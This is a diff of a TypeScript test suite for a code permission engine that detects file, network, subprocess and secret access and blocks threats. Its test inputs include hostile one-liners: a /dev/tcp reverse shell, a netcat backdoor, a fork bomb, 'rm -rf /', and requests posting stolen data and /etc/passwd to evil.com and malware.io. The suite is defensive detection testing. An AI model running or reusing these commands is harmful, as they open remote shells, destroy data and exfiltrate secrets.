@@ -1,74 +1,188 @@
-import { PermissionEngine } from '../src/core/permissions/engine';
-import { PermissionDB } from '../src/core/permissions/db';
-import * as path from 'path';
-import * as fs from 'fs';
+import { PermissionEngine, CodeAnalysisResult } from '../src/core/permissions/engine';
 
-describe('Permission Engine', () => {
+describe('PermissionEngine', () => {
   let engine: PermissionEngine;
-  let db: PermissionDB;
-  const dbPath = path.join(__dirname, 'test-permissions.db');
 
-  beforeAll(() => {
-    if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath);
-    db = new PermissionDB(dbPath);
-    engine = new PermissionEngine(db as any);
-  });
-
-  afterAll(() => {
-    if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath);
-  });
-
-  it('should detect file operations in Python', async () => {
-    const code = 'with open("/etc/passwd", "r") as f: data = f.read()';
-    const analysis = await engine.analyzeCodeStatically(code, 'python3.11');
-    expect(analysis.filesAccessed).toContain('/etc/passwd');
-  });
-
-  it('should detect network egress in JS', async () => {
-    const code = 'fetch("https://api.example.com/data")';
-    const analysis = await engine.analyzeCodeStatically(code, 'node20');
-    expect(analysis.networksAccessed).toContain('api.example.com');
-  });
-
-  it('should detect subprocess execution in Bash', async () => {
-    const code = 'ls -la; cat /tmp/secret.txt';
-    const analysis = await engine.analyzeCodeStatically(code, 'bash');
-    expect(analysis.filesAccessed).toContain('/tmp/secret.txt');
-  });
-
-  it('should flag critical suspicious patterns', async () => {
-    const code = 'os.system("rm -rf /")';
-    const analysis = await engine.analyzeCodeStatically(code, 'python3.11');
-    const critical = analysis.suspiciousPatterns.find(p => p.severity === 'critical');
-    expect(critical).toBeDefined();
-    expect(critical?.pattern).toBe('destructive_command');
-  });
-
-  it('should infer permissions correctly from analysis', async () => {
-    const analysis = {
-      filesAccessed: ['/app/data.json'],
-      networksAccessed: ['google.com'],
-      subprocesses: ['ls'],
-      envVarsAccessed: ['API_KEY'],
-      suspiciousPatterns: []
+  beforeEach(() => {
+    // Mock DB that always returns empty (no pre-approved permissions)
+    const mockDb = {
+      prepare: (_sql: string) => ({
+        all: (..._args: any[]) => []
+      })
     };
-    const permissions = engine.inferPermissions(analysis as any);
-    
-    expect(permissions.some(p => p.type === 'file_read' && p.resource === '/app/data.json')).toBe(true);
-    expect(permissions.some(p => p.type === 'network_egress' && p.resource === 'google.com')).toBe(true);
-    expect(permissions.some(p => p.type === 'subprocess_exec' && p.resource === 'ls')).toBe(true);
-    expect(permissions.some(p => p.type === 'env_read' && p.resource === 'API_KEY')).toBe(true);
+    engine = new PermissionEngine(mockDb as any);
   });
 
-  it('should block execution if permissions are missing in DB', async () => {
-    const execution = {
-      id: 'exec-1',
-      userId: 'user-1',
-      code: 'open("/secret.txt")',
-      language: 'python3.11'
-    };
-    const result = await engine.checkPermissions(execution, 'executor');
-    expect(result.canExecute).toBe(false);
-    expect(result.requiresApprovalFor.length).toBeGreaterThan(0);
+  describe('Static Analysis — File Detection', () => {
+    it('detects Python file open', async () => {
+      const result = await engine.analyzeCodeStatically(`open('/etc/passwd', 'r')`, 'python3.11');
+      expect(result.filesAccessed).toContain('/etc/passwd');
+    });
+
+    it('detects Node.js fs operations', async () => {
+      const result = await engine.analyzeCodeStatically(`fs.readFileSync('/data/config.json')`, 'node20');
+      expect(result.filesAccessed).toContain('/data/config.json');
+    });
+
+    it('detects bash cat command', async () => {
+      const result = await engine.analyzeCodeStatically(`cat /etc/hosts`, 'bash');
+      expect(result.filesAccessed).toContain('/etc/hosts');
+    });
+  });
+
+  describe('Static Analysis — Network Detection', () => {
+    it('detects HTTP URLs', async () => {
+      const result = await engine.analyzeCodeStatically(`fetch('https://api.evil.com/data')`, 'node20');
+      expect(result.networksAccessed).toContain('api.evil.com');
+    });
+
+    it('detects Python requests', async () => {
+      const result = await engine.analyzeCodeStatically(
+        `requests.post('https://malware.io/exfil', data=stolen_data)`, 
+        'python3.11'
+      );
+      expect(result.networksAccessed).toContain('malware.io');
+    });
+
+    it('detects curl commands', async () => {
+      const result = await engine.analyzeCodeStatically(
+        `curl https://example.com/api`, 
+        'bash'
+      );
+      expect(result.networksAccessed).toContain('example.com');
+    });
+  });
+
+  describe('Static Analysis — Subprocess Detection', () => {
+    it('detects Python os.system', async () => {
+      const result = await engine.analyzeCodeStatically(`os.system('whoami')`, 'python3.11');
+      expect(result.subprocesses).toContain('whoami');
+    });
+
+    it('detects Node.js exec', async () => {
+      const result = await engine.analyzeCodeStatically(`exec('ls -la')`, 'node20');
+      expect(result.subprocesses).toContain('ls -la');
+    });
+  });
+
+  describe('Static Analysis — Env Var Detection', () => {
+    it('detects Python os.environ', async () => {
+      const result = await engine.analyzeCodeStatically(`os.environ['AWS_SECRET_KEY']`, 'python3.11');
+      expect(result.envVarsAccessed).toContain('AWS_SECRET_KEY');
+    });
+
+    it('detects Node.js process.env', async () => {
+      const result = await engine.analyzeCodeStatically(`const key = process.env.DATABASE_URL`, 'node20');
+      expect(result.envVarsAccessed).toContain('DATABASE_URL');
+    });
+  });
+
+  describe('Threat Detection — Critical', () => {
+    it('detects rm -rf /', async () => {
+      const result = await engine.analyzeCodeStatically(`rm -rf /`, 'bash');
+      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
+      expect(critical.length).toBeGreaterThan(0);
+      expect(critical.some(p => p.pattern === 'destructive_command')).toBe(true);
+    });
+
+    it('detects fork bomb', async () => {
+      const result = await engine.analyzeCodeStatically(`:(){ :|:& };:`, 'bash');
+      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
+      expect(critical.some(p => p.pattern === 'fork_bomb')).toBe(true);
+    });
+
+    it('detects reverse shell', async () => {
+      const result = await engine.analyzeCodeStatically(
+        `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`, 
+        'bash'
+      );
+      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
+      expect(critical.length).toBeGreaterThan(0);
+    });
+
+    it('detects netcat backdoor', async () => {
+      const result = await engine.analyzeCodeStatically(`nc -e /bin/bash 10.0.0.1 4242`, 'bash');
+      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
+      expect(critical.some(p => p.pattern === 'netcat_shell')).toBe(true);
+    });
+  });
+
+  describe('Threat Detection — High', () => {
+    it('detects eval()', async () => {
+      const result = await engine.analyzeCodeStatically(`eval("malicious_code()")`, 'python3.11');
+      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
+      expect(high.some(p => p.pattern === 'dynamic_code_execution')).toBe(true);
+    });
+
+    it('detects chmod 777', async () => {
+      const result = await engine.analyzeCodeStatically(`chmod 777 /tmp/script.sh`, 'bash');
+      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
+      expect(high.some(p => p.pattern === 'insecure_permissions')).toBe(true);
+    });
+
+    it('detects base64 decoding', async () => {
+      const result = await engine.analyzeCodeStatically(`atob("dGVzdA==")`, 'node20');
+      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
+      expect(high.some(p => p.pattern === 'base64_decode')).toBe(true);
+    });
+
+    it('detects crypto miner patterns', async () => {
+      const result = await engine.analyzeCodeStatically(`connect("stratum+tcp://pool.mining.com")`, 'python3.11');
+      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
+      expect(high.some(p => p.pattern === 'crypto_miner')).toBe(true);
+    });
+  });
+
+  describe('Risk Scoring', () => {
+    it('gives low risk to safe code', async () => {
+      const result = await engine.analyzeCodeStatically(`print("hello world")`, 'python3.11');
+      expect(result.riskScore).toBeLessThan(20);
+    });
+
+    it('gives high risk to dangerous code', async () => {
+      const result = await engine.analyzeCodeStatically(
+        `os.system('rm -rf /')\nrequests.post('https://evil.com', data=open('/etc/passwd').read())`, 
+        'python3.11'
+      );
+      expect(result.riskScore).toBeGreaterThan(50);
+    });
+  });
+
+  describe('Permission Check', () => {
+    it('blocks code needing approval when no permissions pre-configured', async () => {
+      const result = await engine.checkPermissions(
+        { id: 'test-1', userId: 'user-1', code: `open('/etc/passwd').read()`, language: 'python3.11' },
+        'executor'
+      );
+      expect(result.canExecute).toBe(false);
+      expect(result.requiresApprovalFor.length).toBeGreaterThan(0);
+    });
+
+    it('blocks critical threats without even queuing for approval', async () => {
+      const result = await engine.checkPermissions(
+        { id: 'test-2', userId: 'user-1', code: `os.system('rm -rf /')`, language: 'python3.11' },
+        'admin'
+      );
+      expect(result.canExecute).toBe(false);
+      expect(result.blocked).toBe(true);
+    });
+
+    it('allows safe code', async () => {
+      const result = await engine.checkPermissions(
+        { id: 'test-3', userId: 'user-1', code: `print(2 + 2)`, language: 'python3.11' },
+        'executor'
+      );
+      expect(result.canExecute).toBe(true);
+    });
+
+    it('rejects oversized code', async () => {
+      const bigCode = 'x'.repeat(200 * 1024); // 200KB
+      const result = await engine.checkPermissions(
+        { id: 'test-4', userId: 'user-1', code: bigCode, language: 'python3.11' },
+        'executor'
+      );
+      expect(result.canExecute).toBe(false);
+      expect(result.blocked).toBe(true);
+    });
   });
 });
